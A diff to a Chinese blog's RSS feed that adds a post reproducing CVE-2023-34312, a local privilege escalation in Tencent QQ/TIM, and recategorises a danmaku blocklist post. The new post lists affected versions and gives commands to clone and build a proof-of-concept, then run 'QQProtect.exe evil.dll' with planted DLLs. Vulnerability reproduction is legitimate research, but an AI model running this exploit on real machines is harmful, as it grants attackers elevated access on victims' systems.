@@ -9,8 +9,42 @@
     <atom:link href="https://savfile.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description></description>
-    <pubDate>Thu, 19 Jan 2023 11:46:13 GMT</pubDate>
+    <pubDate>Thu, 29 Jun 2023 08:45:13 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>CVE-2023-34312 腾讯 QQ / TIM 本地提权漏洞</title>
+      <link>https://savfile.github.io/posts/5024c62c.html</link>
+      <guid>https://savfile.github.io/posts/5024c62c.html</guid>
+      <pubDate>Thu, 29 Jun 2023 08:45:13 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;QQ 9.7.1.28940 ~ 9.7.8.29039&lt;/li&gt;
+&lt;li&gt;TIM 3.4.5.22071 ~ </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>QQ 9.7.1.28940 ~ 9.7.8.29039</li><li>TIM 3.4.5.22071 ~ 3.4.7.22084</li><li>（QQProtect.exe 未知版本 ~ 4.5.0.9424）</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/img/demonstration.gif" title="Github@vi3t1/qq-tim-elevation"></p><h3 id="编译或下载"><a href="#编译或下载" class="headerlink" title="编译或下载"></a>编译或下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/vi3t1/qq-tim-elevation.git<br>cd poc<br>cargo +stable-i686-pc-windows-msvc build --release --config &quot;build.rustflags = [\&quot;-C\&quot;, \&quot;target-feature=+crt-static\&quot;]&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 编译失败使用下面这个命令</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">cargo +stable-i686-pc-windows-msvc build --release</span><br></code></pre></td></tr></table></figure><p>或从 <a href="https://github.com/savfile/CVE-2023-34312/releases">这里</a> 下载已编译好的版本。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>把两个 DLL 放到 <code>QQProtect.exe</code> 所在的文件夹里。</p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">QQProtect.exe evil.dll<br></code></pre></td></tr></table></figure>]]></content:encoded>
+      
+      
+      <category domain="https://savfile.github.io/categories/%E6%8A%80%E6%9C%AF/">技术</category>
+      
+      
+      <category domain="https://savfile.github.io/tags/%E6%BC%8F%E6%B4%9E/">漏洞</category>
+      
+      <category domain="https://savfile.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</category>
+      
+      <category domain="https://savfile.github.io/tags/CVE/">CVE</category>
+      
+      <category domain="https://savfile.github.io/tags/QQ/">QQ</category>
+      
+      
+      <comments>https://savfile.github.io/posts/5024c62c.html#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>原神怎么你了？</title>
@@ -29,7 +63,7 @@
       <content:encoded><![CDATA[<p>一个哔哩哔哩弹幕网的弹幕屏蔽词配置文件，用于屏蔽 <del>原批</del> 有关原神的弹幕。</p><p>由于哔哩哔哩的 <del>原批</del> 原神玩家数量激增，在弹幕中 <a href="https://zh.moegirl.org.cn/KY" title="萌娘百科：KY">KY</a> 的人也越来越多，为此将我平时使用的屏蔽词分享出来。</p><p><em><strong>可能有严重误伤，请酌情使用</strong>。</em></p><p><strong>下载</strong>：<a href="https://github.com/savfile/genshin-how-you/blob/main/blacklist.xml">Github</a> <a href="https://raw.fastgit.org/savfile/genshin-how-you/main/blacklist.xml">FastGit</a> <a href="https://cdn.staticaly.com/gh/savfile/genshin-how-you/main/blacklist.xml">Statically</a></p>]]></content:encoded>
       
       
-      <category domain="https://savfile.github.io/categories/%E6%8A%80%E6%9C%AF/">技术</category>
+      <category domain="https://savfile.github.io/categories/%E5%A8%B1%E4%B9%90/">娱乐</category>
       
       
       <category domain="https://savfile.github.io/tags/%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9/">哔哩哔哩</category>
